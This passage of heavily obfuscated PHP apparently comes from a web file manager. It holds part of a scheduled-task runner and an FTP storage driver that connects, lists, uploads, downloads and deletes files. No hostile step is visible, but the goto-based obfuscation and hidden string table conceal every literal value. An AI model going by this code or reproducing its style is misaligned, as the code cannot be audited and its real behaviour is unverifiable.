self::valueSet($dš‡ùøÓ [1363], $dš‡ùøÓ [83]); self::valueSet($dš‡ùøÓ [1364], time()); self::taskRunAll(); sleep(self::valueGet($dš‡ùøÓ [1368])); } goto fÄÛ‡ğë„“; fÄÛ‡ğë„“: } public static function restart() { $b–İñö–² =& $_SERVER[Ä¿Ş°¨]; http_close(); self::valueSet($b–İñö–²[683], $b–İñö–²[472]); sleep(self::valueGet($b–İñö–²[1368]) + 5); self::valueSet($b–İñö–²[1363], $b–İñö–²[472]); self::valueSet($b–İñö–²[683], $b–İñö–²[83]); } public static function shutdownEvent() { $DÊ…¬ËŸé =& $_SERVER[Ä¿Ş°¨]; self::valueSet($DÊ…¬ËŸé[1363], $DÊ…¬ËŸé[472]); self::log($DÊ…¬ËŸé[1369]); } public static function config($fæ…§«‘Ä, $AéŞÏâÀ¶Û) { $Fß»ĞôÇÂ =& $_SERVER[Ä¿Ş°¨]; $fµÖÍÊ´É’ = 20; $AéŞÏâÀ¶Û = intval($AéŞÏâÀ¶Û) <= $fµÖÍÊ´É’ ? $fµÖÍÊ´É’ : intval($AéŞÏâÀ¶Û); self::valueSet($Fß»ĞôÇÂ[683], $fæ…§«‘Ä); self::valueSet($Fß»ĞôÇÂ[1368], $AéŞÏâÀ¶Û); } private static function taskRunAll() { $A‰Ô«•Ù‡¬ =& $_SERVER[Ä¿Ş°¨]; $D¶±˜ôù‹ = Model($A‰Ô«•Ù‡¬[1370])->listData(); $bƒ†˜­”õ = count($D¶±˜ôù‹); for ($B›†å”£ÀÌ = 0; $B›†å”£ÀÌ < $bƒ†˜­”õ; $B›†å”£ÀÌ++) { $B‹ÏÄ…– = $D¶±˜ôù‹[$B›†å”£ÀÌ]; if ($B‹ÏÄ…–[$A‰Ô«•Ù‡¬[1371]] != $A‰Ô«•Ù‡¬[83]) { continue; } if (!self::taskTimeCheck($B‹ÏÄ…–)) { continue; } self::taskRun($B‹ÏÄ…–); } Hook::trigger($A‰Ô«•Ù‡¬[1372]); } private static function taskTimeCheck($B¼¬ğÍŠä˜) { goto cÊŸÒÆÎ¡ë; e³¤ÑĞìÂ­: switch ($Dî÷ÓºõÆ[$aèãÆªã‹˜[29]]) { case $aèãÆªã‹˜[1379]: if (time() - $AÖä©…‚ < 3600 * 24 * 30) { return !1; } if ($Dî÷ÓºõÆ[$aèãÆªã‹˜[1379]] == date($aèãÆªã‹˜[1380]) && $e¦½øÅ”ÚÍ) { return !0; } break; case $aèãÆªã‹˜[1381]: if (time() - $AÖä©…‚ < 3600 * 24 * 7) { return !1; } $D‰¯†ªÒİŞ = date($aèãÆªã‹˜[1382]) == 0 ? 7 : date($aèãÆªã‹˜[1382]); if ($Dî÷ÓºõÆ[$aèãÆªã‹˜[1381]] == $D‰¯†ªÒİŞ && $e¦½øÅ”ÚÍ) { return !0; } break; case $aèãÆªã‹˜[1374]: if (time() - $AÖä©…‚ < 3600 * 24) { return !1; } if ($e¦½øÅ”ÚÍ) { return !0; } break; case $aèãÆªã‹˜[1383]: if (time() - $AÖä©…‚ >= floatval($Dî÷ÓºõÆ[$aèãÆªã‹˜[1383]]) * 60) { return !0; } break; default: break; } return !1; goto D’‡ÎÕ¡ï; cÊŸÒÆÎ¡ë: $aèãÆªã‹˜ =& $_SERVER[Ä¿Ş°¨]; $Dî÷ÓºõÆ = json_decode($B¼¬ğÍŠä˜[$aèãÆªã‹˜[186]], !0); $AÖä©…‚ = intval($B¼¬ğÍŠä˜[$aèãÆªã‹˜[1364]]); goto dìÜ›¡›; dìÜ›¡›: $Cí¬±åĞô… = strtotime($aèãÆªã‹˜[1373] . $Dî÷ÓºõÆ[$aèãÆªã‹˜[1374]] . $aèãÆªã‹˜[1375]) - strtotime($aèãÆªã‹˜[1376]); $B÷•Í•ÜäŸ = time() - strtotime(date($aèãÆªã‹˜[1377]) . $aèãÆªã‹˜[1378]); $e¦½øÅ”ÚÍ = $B÷•Í•ÜäŸ >= $Cí¬±åĞô… && $B÷•Í•ÜäŸ <= $Cí¬±åĞô… + 3600; goto e³¤ÑĞìÂ­; D’‡ÎÕ¡ï: } public static function taskRun($BÅ ªì’â¡) { goto Dö›êì“ï; eÊ¥íËç¤ö: $B›Ø²‡ß…Ó = timeFloat(); $a˜Ä—­µÌ˜ = $dÒ”¾ÌœÁà[33]; switch ($BÅ ªì’â¡[$dÒ”¾ÌœÁà[29]]) { case $dÒ”¾ÌœÁà[291]: $dñÀº…ô÷‹ = url_request($BÅ ªì’â¡[$dÒ”¾ÌœÁà[1387]], $dÒ”¾ÌœÁà[212], !1, !1, !1, !1, 5); $a˜Ä—­µÌ˜ = strlen($dñÀº…ô÷‹); break; case $dÒ”¾ÌœÁà[211]: $a˜Ä—­µÌ˜ = Hook::apply($BÅ ªì’â¡[$dÒ”¾ÌœÁà[1387]]); default: break; } goto c±¼ƒ’Û¤; Dö›êì“ï: $dÒ”¾ÌœÁà =& $_SERVER[Ä¿Ş°¨]; self::log($dÒ”¾ÌœÁà[1384] . $BÅ ªì’â¡[$dÒ”¾ÌœÁà[372]] . $dÒ”¾ÌœÁà[1385] . $BÅ ªì’â¡[$dÒ”¾ÌœÁà[28]] . $dÒ”¾ÌœÁà[1386] . $BÅ ªì’â¡[$dÒ”¾ÌœÁà[1387]]); Model($dÒ”¾ÌœÁà[1370])->run($BÅ ªì’â¡[$dÒ”¾ÌœÁà[372]]); goto eÊ¥íËç¤ö; c±¼ƒ’Û¤: Model($dÒ”¾ÌœÁà[1388])->add(array($dÒ”¾ÌœÁà[1389] => $dÒ”¾ÌœÁà[33], $dÒ”¾ÌœÁà[1390] => $dÒ”¾ÌœÁà[472], $dÒ”¾ÌœÁà[29] => $dÒ”¾ÌœÁà[1391] . $BÅ ªì’â¡[$dÒ”¾ÌœÁà[372]], $dÒ”¾ÌœÁà[1392] => json_encode(array($dÒ”¾ÌœÁà[28] => $BÅ ªì’â¡[$dÒ”¾ÌœÁà[28]], $dÒ”¾ÌœÁà[1393] => timeFloat() - $B›Ø²‡ß…Ó, $dÒ”¾ÌœÁà[277] => $a˜Ä—­µÌ˜)))); self::log($dÒ”¾ÌœÁà[1394] . $BÅ ªì’â¡[$dÒ”¾ÌœÁà[372]] . $dÒ”¾ÌœÁà[1395] . $a˜Ä—­µÌ˜); return !0; goto a†ÜùéÛæ§; a†ÜùéÛæ§: } private static function valueGet($e¾È„ÎË¡Ö) { $F´ Ä£º£­ =& $_SERVER[Ä¿Ş°¨]; $d´àŠõİ±“ = $F´ Ä£º£­[1396]; $F•‡Ñ¬ºª = Model($F´ Ä£º£­[1397])->get($e¾È„ÎË¡Ö, $d´àŠõİ±“); if (is_null($F•‡Ñ¬ºª)) { Model($F´ Ä£º£­[1397])->set($F´ Ä£º£­[1368], 10, $d´àŠõİ±“); Model($F´ Ä£º£­[1397])->set($F´ Ä£º£­[683], $F´ Ä£º£­[83], $d´àŠõİ±“); Model($F´ Ä£º£­[1397])->set($F´ Ä£º£­[1363], $F´ Ä£º£­[472], $d´àŠõİ±“); $F•‡Ñ¬ºª = Model($F´ Ä£º£­[1397])->get($e¾È„ÎË¡Ö, $d´àŠõİ±“); } return $F•‡Ñ¬ºª; } private static function valueSet($BˆªÁ•©, $B‹Š„ª®) { $bæ÷Û‹ô• =& $_SERVER[Ä¿Ş°¨]; return Model($bæ÷Û‹ô•[1397])->set($BˆªÁ•©, $B‹Š„ª®, $bæ÷Û‹ô•[1396]); } protected static function log($DğËóÔîâ) { write_log($DğËóÔîâ, $_SERVER[Ä¿Ş°¨][1398]); } private static function cacheClear() { $F§ë‰‹¶³ö =& $_SERVER[Ä¿Ş°¨]; $A›×ÎÅ°¦³ = Model($F§ë‰‹¶³ö[1397])->cacheKey($F§ë‰‹¶³ö[1396]); Cache::clearMemory($A›×ÎÅ°¦³); } } goto Fâ–ÉõÓ—á; fÛÔœÑéÎ: class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = FALSE; public function __construct($FÍ‚‹ƒäòˆ) { parent::__construct(); if (count($FÍ‚‹ƒäòˆ) > 0) { $this->_init($FÍ‚‹ƒäòˆ); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($A½à‡¶°‰Ó) { $aÅÅÌš¼Âğ =& $_SERVER[Ä¿Ş°¨]; global $config; $this->appCharset = $config[$aÅÅÌš¼Âğ[1129]]; $this->systemCharset = $config[$aÅÅÌš¼Âğ[1130]]; if (isset($A½à‡¶°‰Ó[$aÅÅÌš¼Âğ[1131]]) && $A½à‡¶°‰Ó[$aÅÅÌš¼Âğ[1131]]) { $this->systemCharset = $A½à‡¶°‰Ó[$aÅÅÌš¼Âğ[1131]]; } } public function iconvApp($f›†Õù½ª) { return $this->iconvTo($f›†Õù½ª, $this->systemCharset, $this->appCharset); } public function iconvSystem($D°Îƒ†ÑŒª) { return $this->iconvTo($D°Îƒ†ÑŒª, $this->appCharset, $this->systemCharset); } public function getPathOuter($E°¯¯íÄğò) { goto B®Ò…„êó; B®Ò…„êó: $EÊ¤çç›¼ =& $_SERVER[Ä¿Ş°¨]; $AäÉ¨è–Ø§ = $this->iconvApp($this->pathBase); $E°¯¯íÄğò = $this->iconvApp($E°¯¯íÄğò); goto Dƒñ×åæ¹; EÍÇ¦ÃÊ¨: $E°¯¯íÄğò = KodIO::clear($E°¯¯íÄğò); $E°¯¯íÄğò = substr($E°¯¯íÄğò, strlen($AäÉ¨è–Ø§)); if (empty($this->pathDriver)) { return $E°¯¯íÄğò; } goto dá¯»¼³ìã; Dƒñ×åæ¹: if (substr($AäÉ¨è–Ø§, 0, 2) == $EÊ¤çç›¼[1132]) { $AäÉ¨è–Ø§ = BASIC_PATH . substr($AäÉ¨è–Ø§, 2); } if (substr($E°¯¯íÄğò, 0, 2) == $EÊ¤çç›¼[1132]) { $E°¯¯íÄğò = BASIC_PATH . substr($E°¯¯íÄğò, 2); } $AäÉ¨è–Ø§ = KodIO::clear($AäÉ¨è–Ø§); goto EÍÇ¦ÃÊ¨; dá¯»¼³ìã: return $this->pathDriver . $EÊ¤çç›¼[8] . ltrim($E°¯¯íÄğò, $EÊ¤çç›¼[8]); goto BÔ¼‹¹“; BÔ¼‹¹“: } private function _init($a­¶Œëğî• = array()) { goto D¥½•Š´•ã; Eß÷Æ—…°Ü: if (isset($AÌ¿Ã¸“‡º[$A¸—ßÜÙªÄ])) { foreach ($AÌ¿Ã¸“‡º[$A¸—ßÜÙªÄ] as $B¨åŒ¥¤Ñ‰ => $Eñ³ƒ×â‹ˆ) { $this->{$B¨åŒ¥¤Ñ‰} = $Eñ³ƒ×â‹ˆ; } return !0; } $EÇ‡Ú×”‚ò = parse_url(trim($this->server, $FšïÃŞ„»À[8])); $this->host = $EÇ‡Ú×”‚ò[$FšïÃŞ„»À[165]]; goto c»¶Šñô; aâÇµ¬¤Šç: @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); @ftp_pasv($this->connect, !0); $AÌ¿Ã¸“‡º[$A¸—ßÜÙªÄ] = array($FšïÃŞ„»À[1138] => $this->connect, $FšïÃŞ„»À[165] => $this->host, $FšïÃŞ„»À[164] => $this->scheme, $FšïÃŞ„»À[166] => $this->port); goto d“²ˆ¶ÙéŠ; D¥½•Š´•ã: $FšïÃŞ„»À =& $_SERVER[Ä¿Ş°¨]; if (!function_exists($FšïÃŞ„»À[1133])) { show_json(LNG($FšïÃŞ„»À[1134]), !1); } $this->charsetReset($a­¶Œëğî•); goto C¹ÖÜÅùÑÑ; d“²ˆ¶ÙéŠ: return $e¿å´’íÖÆ; goto bî±Æ»åËø; c»¶Šñô: $A„»¦ø„¨ = isset($EÇ‡Ú×”‚ò[$FšïÃŞ„»À[164]]) && $EÇ‡Ú×”‚ò[$FšïÃŞ„»À[164]] == $FšïÃŞ„»À[1135] ? !0 : !1; $this->scheme = $A„»¦ø„¨ ? $FšïÃŞ„»À[1136] : $FšïÃŞ„»À[1137]; $this->port = isset($EÇ‡Ú×”‚ò[$FšïÃŞ„»À[166]]) ? $EÇ‡Ú×”‚ò[$FšïÃŞ„»À[166]] : 21; goto f—Ê’¤¸‚•; C¹ÖÜÅùÑÑ: foreach ($a­¶Œëğî• as $B¨åŒ¥¤Ñ‰ => $Eñ³ƒ×â‹ˆ) { if (isset($this->{$B¨åŒ¥¤Ñ‰})) { $this->{$B¨åŒ¥¤Ñ‰} = $Eñ³ƒ×â‹ˆ; } } static $AÌ¿Ã¸“‡º = array(); $A¸—ßÜÙªÄ = md5(json_encode($a­¶Œëğî•)); goto Eß÷Æ—…°Ü; f—Ê’¤¸‚•: $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return; } $e¿å´’íÖÆ = @ftp_login($this->connect, $this->username, $this->userpass); goto aâÇµ¬¤Šç; bî±Æ»åËø: } private function _isconn() { return is_resource($this->connect); } public function mkfile($f÷ğùœ„Ÿ, $Dàåšî˜Ë‡ = '', $fõàŸÆÒÎÕ = REPEAT_RENAME) { if ($this->setContent($f÷ğùœ„Ÿ, $Dàåšî˜Ë‡)) { return $this->getPathOuter($f÷ğùœ„Ÿ); } return !1; } public function mkdir($a°‰¶Á‹, $D‰Â·µ×â = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $a°‰¶Á‹ = $this->iconvSystem($a°‰¶Á‹); if ($this->isFolder($a°‰¶Á‹) || @ftp_mkdir($this->connect, $a°‰¶Á‹)) { return $this->getPathOuter($a°‰¶Á‹); } if (!$this->mkdir($this->pathFather($a°‰¶Á‹))) { return !1; } if ($a°‰¶Á‹ = @ftp_mkdir($this->connect, $a°‰¶Á‹)) { return $this->getPathOuter($a°‰¶Á‹); } return !1; } public function copyFile($AˆÖÑ½ÙÕÎ, $fä’–Ëä) { goto AâØ—Å­é•; e¬êÅÎ¯ÂÄ: $this->tempFileRemve($c Éá¶Éµ); return $CÃ¬¨¥ïé; goto e¦¼Ó­¾‘õ; AâØ—Å­é•: if (!$this->_isconn()) { return !1; } $DÙµ˜°‘ˆ× = $this->pathThis($this->iconvSystem($AˆÖÑ½ÙÕÎ)); $c Éá¶Éµ = $this->tempFile($DÙµ˜°‘ˆ×); goto f¼”ß‡ØøÇ; f¼”ß‡ØøÇ: $BœáÓá‡Ì‡ = $this->iconvApp($c Éá¶Éµ); $this->download($AˆÖÑ½ÙÕÎ, $BœáÓá‡Ì‡); $CÃ¬¨¥ïé = $this->upload($fä’–Ëä, $BœáÓá‡Ì‡); goto e¬êÅÎ¯ÂÄ; e¦¼Ó­¾‘õ: } public function moveFile($A±ĞÀœ¦”´, $e¬¦ßŠå‡) { if (!$this->_isconn()) { return !1; } $A±ĞÀœ¦”´ = $this->iconvSystem($A±ĞÀœ¦”´); $e¬¦ßŠå‡ = $this->iconvSystem($e¬¦ßŠå‡); $bÔˆââîÖ = @ftp_rename($this->connect, $A±ĞÀœ¦”´, $e¬¦ßŠå‡); return $bÔˆââîÖ ? $this->getPathOuter($e¬¦ßŠå‡) : !1; } public function delFile($Bñ‘ÂÄ•ÚË) { if (!$this->_isconn()) { return !1; } $Bñ‘ÂÄ•ÚË = $this->iconvSystem($Bñ‘ÂÄ•ÚË); return @ftp_delete($this->connect, $Bñ‘ÂÄ•ÚË); } public function delFolder($E—¯‘•’…Ñ) { if (!$this->_isconn()) { return !1; } $E—¯‘•’…Ñ = $this->iconvSystem($E—¯‘•’…Ñ); $fß…‡—„… = $this->ftpList($E—¯‘•’…Ñ); if (!$fß…‡—„…) { return @ftp_rmdir($this->connect, $E—¯‘•’…Ñ); } foreach ($fß…‡—„… as $a¬å–…öÒ) { if ($this->isFolder($a¬å–…öÒ)) { $a¬å–…öÒ = $this->iconvApp($a¬å–…öÒ); $this->delFolder($a¬å–…öÒ); } else { @ftp_delete($this->connect, $a¬å–…öÒ); } } return @ftp_rmdir($this->connect, $E—¯‘•’…Ñ); } public function rename($C¥›ˆùÊ«, $D¯Õƒó ‡Œ) { goto bŠİ©…ÛÀª; f¶š§ªÕ®Á: $fšÑ½Š††ß = rtrim($f¹’Îµ°Ä, $CÑ£šÇ„[8]) . $CÑ£šÇ„[8] . $fĞ½¹…²“¦; $DŒİ½”çÁ† = @ftp_rename($this->connect, $C¥›ˆùÊ«, $fšÑ½Š††ß); $fšÑ½Š††ß = $this->iconvApp($fšÑ½Š††ß); goto fÚëíœÖ”¦; aŸç®Ë¦Ş: $fĞ½¹…²“¦ = $this->iconvSystem($fĞ½¹…²“¦); $C¥›ˆùÊ« = $this->iconvSystem($C¥›ˆùÊ«); $f¹’Îµ°Ä = $this->pathFather($C¥›ˆùÊ«); goto f¶š§ªÕ®Á; bŠİ©…ÛÀª: $CÑ£šÇ„ =& $_SERVER[Ä¿Ş°¨]; if (!$this->_isconn()) { return !1; } $fĞ½¹…²“¦ = $this->fileNameAuto($this->pathFather($C¥›ˆùÊ«), $D¯Õƒó ‡Œ); goto aŸç®Ë¦Ş; fÚëíœÖ”¦: return $DŒİ½”çÁ† ? $this->getPathOuter($fšÑ½Š††ß) : !1; goto C•š›¢ãÇæ; C•š›¢ãÇæ: } private function folderInfo($cÆÜ±ôºÚè, $DáŠ–¬‰Ç› = false) { goto dİÑ¢›Éƒ; dİÑ¢›Éƒ: $aãÚ„ßÊÄ =& $_SERVER[Ä¿Ş°¨]; $c‡éÚß³£™ = $this->getPathOuter(rtrim($cÆÜ±ôºÚè, $aãÚ„ßÊÄ[8])); $dœŠÃ·ªè = $this->pathThis($c‡éÚß³£™); goto FÜ§‰ØË; d÷ˆù¬ê§š: return $DåÖªÉÇŸ‹; goto C”¦™íáÛ’; FÜ§‰ØË: $D‡ŒŒŸé‰Ì = $this->iconvSystem($cÆÜ±ôºÚè); if ($DáŠ–¬‰Ç›) { return array($aãÚ„ßÊÄ[28] => $dœŠÃ·ªè, $aãÚ„ßÊÄ[75] => $c‡éÚß³£™, $aãÚ„ßÊÄ[29] => $aãÚ„ßÊÄ[76]); } $DåÖªÉÇŸ‹ = array($aãÚ„ßÊÄ[28] => $dœŠÃ·ªè, $aãÚ„ßÊÄ[75] => $c‡éÚß³£™, $aãÚ„ßÊÄ[29] => $aãÚ„ßÊÄ[76], $aãÚ„ßÊÄ[183] => 0, $aãÚ„ßÊÄ[106] => 0, $aãÚ„ßÊÄ[1139] => !0, $aãÚ„ßÊÄ[1140] => !0); goto d÷ˆù¬ê§š; C”¦™íáÛ’: } private function fileInfo($f‰¼æ˜•±³, $F±  ŒĞ˜² = false) { goto A¢¦—ÖÁ; A¢¦—ÖÁ: $DóØ‹ò‡£Ö =& $_SERVER[Ä¿Ş°¨]; $C¹¾¸çÅµ‡ = $this->getPathOuter(rtrim($f‰¼æ˜•±³, $DóØ‹ò‡£Ö[8])); $B‰©ß´öŒÎ = $this->pathThis($C¹¾¸çÅµ‡); goto aÒ–ù‘Îâ; C¯‘¸¬Õø™: $c»˜¢çœ†[$DóØ‹ò‡£Ö[106]] = $c»˜¢çœ†[$DóØ‹ò‡£Ö[106]] > 0 ? $c»˜¢çœ†[$DóØ‹ò‡£Ö[106]] : 0; return $c»˜¢çœ†; goto Dø‘ÙàçÄ¼; aÒ–ù‘Îâ: $F¯œŸ’Â¦Ú = $this->iconvSystem($f‰¼æ˜•±³); if ($F±  ŒĞ˜²) { return array($DóØ‹ò‡£Ö[28] => $B‰©ß´öŒÎ, $DóØ‹ò‡£Ö[75] => $C¹¾¸çÅµ‡, $DóØ‹ò‡£Ö[29] => $DóØ‹ò‡£Ö[163], $DóØ‹ò‡£Ö[156] => $this->ext($f‰¼æ˜•±³), $DóØ‹ò‡£Ö[77] => $this->size($f‰¼æ˜•±³)); } $c»˜¢çœ† = array($DóØ‹ò‡£Ö[28] => $B‰©ß´öŒÎ, $DóØ‹ò‡£Ö[75] => $C¹¾¸çÅµ‡, $DóØ‹ò‡£Ö[29] => $DóØ‹ò‡£Ö[163], $DóØ‹ò‡£Ö[183] => 0, $DóØ‹ò‡£Ö[106] => @ftp_mdtm($this->connect, $F¯œŸ’Â¦Ú), $DóØ‹ò‡£Ö[156] => $this->ext($f‰¼æ˜•±³), $DóØ‹ò‡£Ö[77] => $this->size($f‰¼æ˜•±³), $DóØ‹ò‡£Ö[1139] => !0, $DóØ‹ò‡£Ö[1140] => !0); goto C¯‘¸¬Õø™; Dø‘ÙàçÄ¼: } public function size($bÌñ‘„ƒê) { $fœ³ò‹•– = $this->objectMeta($bÌñ‘„ƒê); return $fœ³ò‹•– ? $fœ³ò‹•–[$_SERVER[Ä¿Ş°¨][77]] : 0; } public function info($F•ğĞªÁ¡Ú) { if ($this->isFile($F•ğĞªÁ¡Ú)) { return $this->fileInfo($F•ğĞªÁ¡Ú, 0); } else { if ($this->isFolder($F•ğĞªÁ¡Ú)) { return $this->folderInfo($F•ğĞªÁ¡Ú); } } return !1; } public function exist($dÊ£ƒ‡ïÒ¡) { return $this->objectMeta($dÊ£ƒ‡ïÒ¡) ? !0 : !1; } public function isFile($C¿ëµŞ÷Ùé) { $Dà±Œè™±¹ =& $_SERVER[Ä¿Ş°¨]; $eÑò®¯óà = $this->objectMeta($C¿ëµŞ÷Ùé); return $eÑò®¯óà ? $eÑò®¯óà[$Dà±Œè™±¹[29]] == $Dà±Œè™±¹[163] : !1; } public function isFolder($E¿¶²¥Ë‡) { $F„†¦ĞòÅ¦ =& $_SERVER[Ä¿Ş°¨]; $F†ÌÁ‰æŒ = $this->objectMeta($E¿¶²¥Ë‡); return $F†ÌÁ‰æŒ ? $F†ÌÁ‰æŒ[$F„†¦ĞòÅ¦[29]] == $F„†¦ĞòÅ¦[76] : !1; } public function listPath($A”°ß¾â·, $aïœ­íƒçÍ = false) { goto F¯µã›Œ¥ë; F¯µã›Œ¥ë: $D×Ì¹­À…ö =& $_SERVER[Ä¿Ş°¨]; if (!$this->_isconn()) { return !1; } $A”°ß¾â· = $this->iconvSystem($A”°ß¾â·); goto dÑ” Ëæà; ağİ–«¾Œƒ: foreach ($D“…Ùª‹ã as $A”°ß¾â·) { if ($this->isFolder($A”°ß¾â·)) { $Dªè’Ê†Ã¦[$D×Ì¹­À…ö[74]][] = $this->folderInfo($A”°ß¾â·, $aïœ­íƒçÍ); } else { $Dªè’Ê†Ã¦[$D×Ì¹­À…ö[73]][] = $this->fileInfo($A”°ß¾â·, $aïœ­íƒçÍ); } } return $Dªè’Ê†Ã¦; goto D—Åäçö¥; dÑ” Ëæà: $D“…Ùª‹ã = $this->ftpList($A”°ß¾â·); $Dªè’Ê†Ã¦ = array($D×Ì¹­À…ö[74] => array(), $D×Ì¹­À…ö[73] => array()); if (!$D“…Ùª‹ã) { return $Dªè’Ê†Ã¦; } goto ağİ–«¾Œƒ; D—Åäçö¥: } public function has($aÓ³ğ¼Ù‘ã, $BŞ’©¬ªØ = false, $fÏëŸ¤ÅÒ÷ = true) { goto FÓ—Ä·¨†; dÀÓíÇ…®: $BŞË²¤Ô§± = $this->ftpList($aÓ³ğ¼Ù‘ã); if (!$BŞË²¤Ô§±) { return !1; } if ($BŞ’©¬ªØ) { return array($d‡ÚÃ®‘·õ[187] => 0, $d‡ÚÃ®‘·õ[188] => count($BŞË²¤Ô§±)); } goto B‡•ŒŠÀÛŞ; B‡•ŒŠÀÛŞ: foreach ($BŞË²¤Ô§± as $aÓ³ğ¼Ù‘ã) { if ($fÏëŸ¤ÅÒ÷) { if (!$this->isFolder($aÓ³ğ¼Ù‘ã)) { return !0; } } else { if ($this->isFolder($aÓ³ğ¼Ù‘ã)) { return !0; } } } return !1; goto A¿ºàÖáâ”; FÓ—Ä·¨†: $d‡ÚÃ®‘·õ =& $_SERVER[Ä¿Ş°¨]; if (!$this->_isconn()) { return !1; } $aÓ³ğ¼Ù‘ã = $this->iconvSystem($aÓ³ğ¼Ù‘ã); goto dÀÓíÇ…®; A¿ºàÖáâ”: } public function listAll($fƒÌ¬•°£) { goto eÓ¥ÁÒ­ ó; B¨ßƒ‚Öæ©: foreach ($eâ•±‘ÅŸ­[$FŸß®õ§ˆµ[74]] as $a‹è÷ÏÃƒ) { $A—¹øîèé‘[] = array($FŸß®õ§ˆµ[75] => $FŸß®õ§ˆµ[8] . trim(str_replace($fƒÌ¬•°£, $FŸß®õ§ˆµ[33], $a‹è÷ÏÃƒ), $FŸß®õ§ˆµ[8]) . $FŸß®õ§ˆµ[8], $FŸß®õ§ˆµ[76] => 1, $FŸß®õ§ˆµ[77] => 0); } foreach ($eâ•±‘ÅŸ­[$FŸß®õ§ˆµ[73]] as $F¶ö¸Áù×Í) { $A—¹øîèé‘[] = array($FŸß®õ§ˆµ[75] => $FŸß®õ§ˆµ[8] . trim(str_replace($fƒÌ¬•°£, $FŸß®õ§ˆµ[33], $F¶ö¸Áù×Í), $FŸß®õ§ˆµ[8]), $FŸß®õ§ˆµ[76] => 0, $FŸß®õ§ˆµ[77] => $this->size($F¶ö¸Áù×Í)); } return $A—¹øîèé‘; goto bºè¼¬†÷È; eÓ¥ÁÒ­ ó: $FŸß®õ§ˆµ =& $_SERVER[Ä¿Ş°¨]; if (!$this->_isconn()) { return !1; } $fƒÌ¬•°£ = $this->iconvSystem($fƒÌ¬•°£); goto EÕ¥Ñ¡Ğ¿í; EÕ¥Ñ¡Ğ¿í: $eâ•±‘ÅŸ­ = array($FŸß®õ§ˆµ[73] => array(), $FŸß®õ§ˆµ[74] => array()); $this->recursionFtpFiles($fƒÌ¬•°£, $eâ•±‘ÅŸ­); $A—¹øîèé‘ = array(); goto B¨ßƒ‚Öæ©; bºè¼¬†÷È: } public function getContent($FˆæÇù÷º¹) { if (!$this->_isconn()) { return !1; } $FˆæÇù÷º¹ = $this->iconvSystem($FˆæÇù÷º¹); return $this->fileSubstr($FˆæÇù÷º¹); } public function setContent($a´ö‹”†À­, $F…Ù™ğ¡¸â = '') { goto E¨ÅÆéåò¢; E¨ÅÆéåò¢: if (!$this->_isconn()) { return !1; } $aØê³®‰êÉ = $this->pathThis($this->iconvSystem($a´ö‹”†À­)); $bŠ÷ƒì•«¸ = $this->tempFile($aØê³®‰êÉ); goto Cë²×Åª®; b½²“‚³•: return $dß‚ËŠİ™‚; goto cŠæÏë¶¾Ÿ; Cë²×Åª®: file_put_contents($bŠ÷ƒì•«¸, $F…Ù™ğ¡¸â); $dß‚ËŠİ™‚ = $this->upload($a´ö‹”†À­, $this->iconvApp($bŠ÷ƒì•«¸)); $this->tempFileRemve($bŠ÷ƒì•«¸); goto b½²“‚³•; cŠæÏë¶¾Ÿ: } public function fileSubstr($dùé‚ßœîì, $d Â„ÖÏóö = 0, $D¹ˆåĞ¨¶é = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($dùé‚ßœîì, $d Â„ÖÏóö, $D¹ˆåĞ¨¶é); } private function ftpRequest($C´šéÊÕ‚ˆ, $aíã˜‰‹éœ = 0, $fø¤»ã¬ßÌ = false) { goto FêŠæÁÀ¸î; FêŠæÁÀ¸î: $C´šéÊÕ‚ˆ = $this->iconvSystem($C´šéÊÕ‚ˆ); $Fàª‡åçµ¡ = $this->scheme . $this->host . $_SERVER[Ä¿Ş°¨][4] . $this->port; $BÂ°ù¼¨¸ç = curl_init(); goto BÏÄë«ÍÖ; BÏÄë«ÍÖ: curl_setopt($BÂ°ù¼¨¸ç, CURLOPT_URL, $Fàª‡åçµ¡ . $this->pathEncode($C´šéÊÕ‚ˆ)); curl_setopt($BÂ°ù¼¨¸ç, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($fø¤»ã¬ßÌ) { $e»÷Ü—¸ = $aíã˜‰‹éœ + $fø¤»ã¬ßÌ - 1; curl_setopt($BÂ°ù¼¨¸ç, CURLOPT_RANGE, "{$aíã˜‰‹éœ}\x2d{$e»÷Ü—¸}"); } goto b´™“ó‡«‘; b´™“ó‡«‘: curl_setopt($BÂ°ù¼¨¸ç, CURLOPT_RETURNTRANSFER, 1); $cƒæá„Ä¯ = curl_exec($BÂ°ù¼¨¸ç); curl_close($BÂ°ù¼¨¸ç); goto cÄ²Ÿ–°’; cÄ²Ÿ–°’: return $cƒæá„Ä¯; goto D»õğ§ÂïÖ; D»õğ§ÂïÖ: } public function upload($eä¥–Î±Š, $aª¥¬×Å™ò, $BŠœæƒ¦ = false, $aï˜Ÿ ‹•Ø = REPEAT_REPLACE) { goto EÔÄíˆ’·Ô; a®„‡Ø±Ç: if ($d‚’º²à¹· != FTP_FINISHED) { return !1; } return $this->getPathOuter($eä¥–Î±Š); goto F¯ßÎëË²à; f‰ƒõî°´Ô: $aª¥¬×Å™ò = $this->iconvSystem($aª¥¬×Å™ò); $d‚’º²à¹· = ftp_nb_put($this->connect, $eä¥–Î±Š, $aª¥¬×Å™ò, FTP_BINARY); while ($d‚’º²à¹· == FTP_MOREDATA) { $d‚’º²à¹· = ftp_nb_continue($this->connect); } goto a®„‡Ø±Ç; EÔÄíˆ’·Ô: if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($eä¥–Î±Š))) { return !1; } $eä¥–Î±Š = $this->iconvSystem($eä¥–Î±Š); goto f‰ƒõî°´Ô; F¯ßÎëË²à: } public function download($Côè¤Ãçó„, $AİĞòò¬Ş = '') { goto C¾ÑÏ³ª‘ù; cÙÍÁ›í‰: while ($eŒ±‘À´íÄ == FTP_MOREDATA) { $eŒ±‘À´íÄ = ftp_nb_continue($this->connect); } if ($eŒ±‘À´íÄ != FTP_FINISHED) { return !1; } return $this->iconvApp($AİĞòò¬Ş); goto Eª¥¼ÍŞ»ì; F”‰î¿ÊÔš: $Côè¤Ãçó„ = $this->iconvSystem($Côè¤Ãçó„); $AİĞòò¬Ş = $this->iconvSystem($AİĞòò¬Ş); $eŒ±‘À´íÄ = 